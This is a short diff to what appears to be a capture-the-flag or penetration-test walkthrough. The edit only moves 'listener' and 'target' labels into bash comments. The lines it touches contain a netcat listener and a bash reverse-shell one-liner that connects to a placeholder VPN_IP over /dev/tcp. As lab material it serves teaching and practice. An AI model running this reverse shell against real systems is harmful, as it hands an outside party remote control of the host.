@@ -217,14 +217,14 @@ uid=1001(apache) gid=1001(apache) groups=1001(apache)
 ## 4. Setup a Reverse Shell
 
 ```bash
+# listener
 nc -lnvp 9001
 ```
-> listener
 
 ```bash
+# target
 bash -c 'bash -i >& /dev/tcp/VPN_IP/9001 0>&1'
 ```
-> target
 
 ```bash
 $ export TERM=xterm
